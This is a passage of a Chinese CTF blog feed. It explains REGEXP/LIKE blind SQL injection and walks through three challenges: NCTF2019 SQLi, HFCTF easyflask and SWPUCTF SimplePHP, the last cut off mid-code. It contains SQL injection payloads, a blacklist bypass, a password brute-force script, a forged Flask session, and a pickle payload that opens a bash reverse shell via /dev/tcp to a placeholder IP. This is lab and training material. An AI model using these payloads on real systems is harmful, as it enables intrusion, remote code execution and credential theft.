    <content type="html"><![CDATA[<h1>REGEXP注入与LIKE注入</h1><h3 id="REGEXP注入"><a class="header-anchor" href="#REGEXP注入">🍭</a>REGEXP注入</h3><p>REGEXP注入，即regexp正则表达式注入，又叫盲注值正则表达式攻击。</p><h4 id="注入原理"><a class="header-anchor" href="#注入原理">🍭</a>注入原理</h4><p>直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><p>格式：</p><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>语句) regexp <span class="hljs-string">&#x27;正则&#x27;</span></code></pre><p>若匹配则返回1，不匹配返回0</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>) regexp <span class="hljs-string">&#x27;^a&#x27;</span>;</code></pre><p><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</p><p>regexp关键字可以代替where条件里的=号</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span> regexp <span class="hljs-string">&#x27;^ad&#x27;</span>;</code></pre><img src="/2021/08/01/regexp/1.png" alt="1" style="zoom:80%;"><blockquote><p>过滤了=、in、like时可使用，<code>^</code>若被过滤，可使用<code>$</code>从后往前进行匹配</p></blockquote><p>常用regexp正则语句：</p><pre><code class="hljs sql">regexp &#x27;^[a-z]&#x27;  <span class="hljs-comment">#判断一个表的第一个字符串是否在a-z中</span>regexp &#x27;^r&#x27;      <span class="hljs-comment">#判断第一个字符串是否为r</span>regexp &#x27;^r[a-z]&#x27; <span class="hljs-comment">#判断一个表的第二个字符串是否在a-z中</span></code></pre><p>盲注：</p><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; or database() regexp &#x27;</span>^s<span class="hljs-string">&#x27;--+ </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">database</span>() regexp <span class="hljs-string">&#x27;y$&#x27;</span><span class="hljs-comment">--+ </span></code></pre><p>用双反斜杠（<code>\\</code>）来引用元字符（具有特殊含义的字符）</p><p>常用引用元字符：</p><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:center">[]</td><td style="text-align:left">左右方括号用于指定<strong>字符类</strong>。字符类是进行匹配时所要依据的一组字符。除连字符 (-) 和脱字符 (^) 外，在字符类中指定的元字符和量词（如 * 和 {m}，分别为元字符和量词）没有特殊意义，可当作实际字符进行运算。</td></tr><tr><td style="text-align:center">*</td><td style="text-align:left">星号可用于与字符匹配 0 次或多次。例如，<code>REGEXP '.*abc'</code> 匹配的字符串以 abc 结尾并以任何前缀开头。因此，aabc、xyzabc 和 abc 匹配，但 bc 和 abcc 则不匹配。</td></tr><tr><td style="text-align:center">？</td><td style="text-align:left">问号可用于与字符匹配 0 次或 1 次。例如，<code>'colou?r'</code> 匹配 color 和 colour。</td></tr><tr><td style="text-align:center">+</td><td style="text-align:left">加号可用于与字符匹配 1 次或多次。例如，<code>'bre+'</code> 匹配 bre 和 bree，但不匹配 br。</td></tr><tr><td style="text-align:center">-</td><td style="text-align:left">可以在字符类中使用一个连字符来表示一个范围。例如，<code>REGEXP '[a-e]'</code> 匹配 a、b、c、d 和 e。</td></tr><tr><td style="text-align:center">%</td><td style="text-align:left">百分号可与 SIMILAR TO 配合使用来匹配任意数目的字符。不将百分号视为 REGEXP 和 REGEXP_SUBSTR 所使用的元字符。当指定时，它匹配百分号 (%)。</td></tr><tr><td style="text-align:center">_</td><td style="text-align:left">可将下划线与 SIMILAR TO 配合使用来匹配单个字符。不将下划线视为 REGEXP 和 REGEXP_SUBSTR 所使用的元字符。当指定时，它匹配下划线 (_)。</td></tr><tr><td style="text-align:center">|</td><td style="text-align:left">管道符号用于指定匹配字符串时要使用的替代模式。在由竖线分隔的一行模式中，竖线被解释为 OR，匹配过程从最左侧的模式开始，在找到第一个匹配项时停止。因此，您应按优先级的降序顺序列出模式。您可以指定任意数量的替代模式。</td></tr><tr><td style="text-align:center">()</td><td style="text-align:left">当左括号和右括号用于正则表达式的各个组合部分时，它们为元字符。例如，<code>(ab)*</code> 匹配零个或多个 ab 的重复项。与使用数学表达式一样，您使用组合来控制正则表达式各部分的计算顺序。</td></tr><tr><td style="text-align:center">{}</td><td style="text-align:left">当左大括号和右大括号用于指定量词时，它们为元字符。量词指定一个模式要构成某个匹配所必须重复的次数。例如：<br>{m}   匹配某个字符正好 m 次。例如，‘519-[0-9]{3}-[0-9]{4}’ 匹配 519 地区号中的一个电话号码（假定数据按语法中定义的方式进行格式设置）。<br><br>{m,}   匹配某个字符至少 m 次。例如，‘[0-9]{5,}’ 匹配任何含有五个或更多数字的字符串。<br><br>{m,n}   匹配某个字符至少 m 次，但不超过 n 次。例如，SIMILAR TO ‘_{5,10}’ 匹配任何含有 5 到 10（含 5 和 10）个字符的字符串。<br></td></tr><tr><td style="text-align:center">\</td><td style="text-align:left">反斜线被用作元字符的转义字符。它也可被用于转义非元字符。</td></tr><tr><td style="text-align:center">^</td><td style="text-align:left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td style="text-align:center">$</td><td style="text-align:left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td style="text-align:center">.</td><td style="text-align:left">匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。</td></tr><tr><td style="text-align:center">:</td><td style="text-align:left">在字符集中使用冒号来指定子字符类。例如，<code>'[[:alnum:]]'</code></td></tr></tbody></table><ul><li>多数正则表达式实现使用单个反斜杠转义特殊字符，一遍能使用这些字符本身，但是MySQL要求两个反斜杠（MySQL自己解释一个，正则表达式库解释另一个）。</li><li>^ 符号的双重用途： ^在集合中（用 [ ] 定义）时用它来否定该集合，否则用来指定串的开始处。</li></ul><p>表达式顺序</p><p><code>'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]'-&gt; '^email[a-z]' -&gt; FALSE</code></p><p>实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。如：where table_schema=‘security’ limit 0,1。table_schema='security’已经起到了限定作用了，limit有没有已经不重要了</p><h3 id="LIKE注入"><a class="header-anchor" href="#LIKE注入">🍭</a>LIKE注入</h3><p><strong>like匹配</strong><br>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线<code>_</code>通配符允许匹配任何单个字符。</p><p>like 's%'判断第一个字符是否为s</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">s</span>%&#x27;,3 --+</span></code></pre><p>.like 'se%'判断前面两个字符串是否为se</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">se</span>%&#x27;,3 --+</span></code></pre><p>like ‘%se%’ 判断是否包含se两个字符串</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;%<span class="hljs-title">se</span>%&#x27;,3 --+</span></code></pre><p>like '_____'判断是否为5个字符</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">_____</span>&#x27;,3 --+</span></code></pre><p>like ‘s____’ 判断第一个字符是否为s</p><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>() <span class="hljs-title">like</span> &#x27;<span class="hljs-title">s____</span>&#x27;,3 --+</span></code></pre><p>盲注:</p><blockquote><p>判断数据库长度<br>可用length()函数，也可用_，如：<code>' or database() like '________'--+</code><br>判断数据库名</p><p><code>' or database() like 's%'--+</code>也可用<code>' or database() like 's_______'--+</code></p></blockquote><p>表达式的顺序：</p><p><code>'^e[a-z]' -&gt; '^em[a-z]' -&gt; '^ema[a-z]' -&gt; '^emai[a-z]'-&gt; '^email[a-z]' -&gt; TRUE</code></p><p>之所以表达式 news[a-z]查询后返回正确是应为%代表0-n个字符，使用&quot;_&quot;则只能代表一个字符。故确认后续是否还有字符用如下表达式</p><p><code>'email%' TRUE -&gt; 'email_' FALSE</code></p><p>同理可以用相同的方法获取字段，值。</p><h4 id="LIKE-和-REGEXP之间的差别"><a class="header-anchor" href="#LIKE-和-REGEXP之间的差别">🍭</a>LIKE 和 REGEXP之间的差别</h4><p>LIKE 匹配整个列，如果被匹配的文本在列值中出现，LIKE 将不会找到它，相应的行也不会被返回（除非使用通配符）。而 REGEXP 在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP 将会找到它，相应的行将被返回，并且 REGEXP 能匹配整个列值（与 LIKE 相同的作用）。</p><h1>[NCTF2019]SQLi</h1><p>主页是一个登录框 。把sql语句显示出来了:</p><p><img src="/2021/08/01/regexp/2.png" alt="2"></p><p>信息搜集，robots.txt，有个hint.txt</p><pre><code class="hljs sql">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">greatest</span>|%<span class="hljs-number">00</span>|\<span class="hljs-string">&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><span class="hljs-string">If $_POST[&#x27;</span>passwd<span class="hljs-string">&#x27;] === admin&#x27;</span>s <span class="hljs-keyword">password</span>,<span class="hljs-keyword">Then</span> you will <span class="hljs-keyword">get</span> the flag;</code></pre><p>密码等于admin密码即可获得flag。并没有对用户名做限制，由于单引号被禁用，使用 \ 转义and前面的那个单引号，使得<code>'\' and passwd='</code>形成闭合,构造passwd处为<code> ||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code><br>用regexp查询passwd ^匹配字符串开头 %00截断后面的内容，需要抓包提交（直接提交，会被url encode 变为%2500被黑名单拦截）即为 <code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code><br>查询语句变为: <code>select * from users where username='\' and passwd='||/**/passwd/**/regexp</code><br>用<code> username='\' and passwd='||1;%00'</code>测试条件为真时就会跳转到web.php;(fuzz也可以) 条件为假时就会回到登陆页。</p><p>脚本跑一下密码：</p><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requestsfrom urllib <span class="hljs-keyword">import</span> parse<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span>str1 = string.ascii_letters+<span class="hljs-string">&#x27;_&#x27;</span>+string.digitsurl=<span class="hljs-string">&#x27;http://9d86404e-b5c0-41ff-b8ef-f9bbf6da8e8c.node3.buuoj.cn/index.php&#x27;</span>flag=<span class="hljs-string">&#x27;79&#x27;</span>a=parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> str1:        <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,              <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||passwd/**/regexp/**/0x&quot;</span>+flag+hex(ord(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)+<span class="hljs-string">&quot;;&quot;</span>+a            &#125;        r=requests.post(url=url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome.php&#x27;</span> <span class="hljs-built_in">in</span> r.<span class="hljs-keyword">text</span>:            flag+=hex(ord(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)            print(flag)            break        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.5</span>)        #防止<span class="hljs-number">429</span></code></pre><p>用密码登录即可获得flag</p><p><img src="/2021/08/01/regexp/3.png" alt="3"></p><p>参考：<a href="https://blog.csdn.net/qq_36761831/article/details/82862135">https://blog.csdn.net/qq_36761831/article/details/82862135</a></p><p><a href="https://blog.csdn.net/qq_35569814/article/details/100526540">https://blog.csdn.net/qq_35569814/article/details/100526540</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/106029042">https://blog.csdn.net/weixin_43610673/article/details/106029042</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（四）</title>
    <link href="/2021/07/30/black/"/>
    <url>/2021/07/30/black/</url>
    
    <content type="html"><![CDATA[<h1>[HFCTF 2021 Final]easyflask</h1><p>任意文件读取，根据提示读取源码</p><pre><code class="hljs lua">#!/usr/bin/python3<span class="hljs-number">.6</span>import <span class="hljs-built_in">os</span>import picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.<span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (object,), &#123;    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,&#125;)@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))def index_handler():    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):        u = pickle.dumps(User())        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span>@app.route(<span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))def file_handler():    <span class="hljs-built_in">path</span> = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)    <span class="hljs-built_in">path</span> = <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-built_in">path</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-built_in">path</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.isdir(<span class="hljs-built_in">path</span>) \            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span>    with <span class="hljs-built_in">open</span>(<span class="hljs-built_in">path</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as fp:        content = fp.<span class="hljs-built_in">read</span>()    <span class="hljs-keyword">return</span> content@app.route(<span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))def admin_handler():    try:        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)        <span class="hljs-keyword">if</span> isinstance(u, dict):#如果u对应的值是字典，会读取  u.b            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))        u = pickle.loads(u)#pickle反序列化    except Exception:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, <span class="hljs-built_in">debug</span>=False)</code></pre><p><code>/file</code> 路由，用户上传的 path 会被拼接到 static 目录后面，这里有个trick，当 os.path.join 的第二个参数为绝对路径时拼接的结果就是该绝对路径,可实现任意文件读取。此处对参数做了一些限制。</p><img src="/2021/07/30/black/1.png" alt="1" style="zoom:67%;"><p><code>/admin</code> 路由里使用 pickle 模块直接将 session 里的内容反序列化，反序列化必然包含创建新对象的操作，如果 <code>__reduce__</code> 里包含攻击代码就可以实现RCE，反序列化的输出储存在 session 里，但是 session 数据都是 flask 加密过的，只有知道 secret_key 才能伪造 session 实现 RCE。利用伪文件系统 <code>/proc</code>，结合前面的任意文件读取漏洞可以读取到自身的环境变量，即<code>/file?file=/proc/self/environ</code>，得到<code>secret_key</code>。</p><p><img src="/2021/07/30/black/2.png" alt="2"></p><h4 id="tips-Flask-session身份伪造"><a class="header-anchor" href="#tips-Flask-session身份伪造">🍭</a>tips:Flask-session身份伪造</h4><p>flask是把session存在客户端的，而且只经过base64编码和用密钥签名，虽然没有有签名不可以伪造session，但是有很多信息我们可以直接从session解码找出来。</p><p>如一串 <strong>session</strong> 值为： <strong>eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY</strong> ，解密：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> *s = &quot;eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY&quot;data,<span class="hljs-type">timestamp</span>,secret = s.split(<span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-type">int</span>.from_bytes(base64_decode(<span class="hljs-type">timestamp</span>),byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)</code></pre><p><img src="/2021/07/30/black/6.png" alt="6"></p><p>即可获取信息。</p><p>flask解密脚本：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                        <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                            <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(<span class="hljs-string">&quot;session值&quot;</span>.encode()))</code></pre><p>FLASK加密脚本：<br><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>开始伪造session：（利用反弹shell构造的简单反序列化）</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<span class="hljs-keyword">import</span> os<span class="hljs-keyword">User</span> = <span class="hljs-keyword">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-keyword">object</span>,), &#123;    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;tyskill&#x27;</span>,    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#x27;&quot;,))&#125;)u = pickle.dumps(<span class="hljs-keyword">User</span>())print(b64encode(u).decode())//win和linux下dumps的结果中序列化字符串声明系统的标识符不同：Linux=&gt;posix；Windows=&gt;nt，需要将脚本放在Linux环境下生成序列化字符串</code></pre><p>执行</p><p><img src="/2021/07/30/black/4.png" alt="4"></p><p>加密：</p><p><img src="/2021/07/30/black/5.png" alt="5"></p><p>替换掉session，用靶机监听即可RCE。</p><p>参考：<a href="https://blog.csdn.net/LYJ20010728/article/details/117422046">https://blog.csdn.net/LYJ20010728/article/details/117422046</a></p><p><a href="https://xz.aliyun.com/t/3569#toc-0">https://xz.aliyun.com/t/3569#toc-0</a></p><h1>[SWPUCTF 2018]SimplePHP</h1><p>查看文件页面可以直接读取文件内容</p><p>file.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>] ? $_GET[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($file)) &#123;     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; &#125; $show = <span class="hljs-keyword">new</span> Show(); <span class="hljs-keyword">if</span>(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($file))&#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); &#125; <span class="hljs-meta">?&gt;</span></code></pre><p>file_exists判断file参数的文件是否存在，故伪协议不能用。若文件存在，将要读取的文件赋值给Show类的$source。调用_show()，这个函数在class.php中</p><pre><code class="hljs reasonml">public <span class="hljs-keyword">function</span> <span class="hljs-constructor">_show()</span>&#123;    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">file</span>:|<span class="hljs-params">gopher</span>|<span class="hljs-params">dict</span>|\.\.|<span class="hljs-params">f1ag</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>) &#123;        die(&#x27;hacker!&#x27;);    &#125; <span class="hljs-keyword">else</span>&#123;            highlight<span class="hljs-constructor">_file($<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>;    &#125;      &#125;</code></pre><p>传入的文件名正则过滤，绕过就读取源码；总结读取流程：文件名==&gt;file_exists==正则过滤==&gt;读取</p><p>function.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//show_source(__FILE__); </span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; header(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); error_reporting(<span class="hljs-number">0</span>); <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-keyword">global</span> $_FILES;     $filename = md5($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].$_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>;     <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . $filename);     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-keyword">global</span> $_FILES;     <span class="hljs-keyword">if</span>(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-keyword">global</span> $_FILES;     $allowed_types = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);     $temp = explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);     $extension = end($temp);     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($extension)) &#123;         <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span>    &#125;     <span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">if</span>(in_array($extension,$allowed_types)) &#123;             <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;         &#125;         <span class="hljs-keyword">else</span> &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;             <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;         &#125;     &#125; &#125; <span class="hljs-meta">?&gt;</span></code></pre><p>调用upload_file函数。 <code>upload_file_check()：判断文件后缀名，必须是gif/jpeg/jpg/png</code> ==&gt;<code>upload_file_do() 上传文件;文件名=md5(文件名+IP地址)</code></p><p>序列化，无unserialize()，文件上传，phar协议未过滤，应该要phar反序列化。</p><p>class.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;str = $name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span 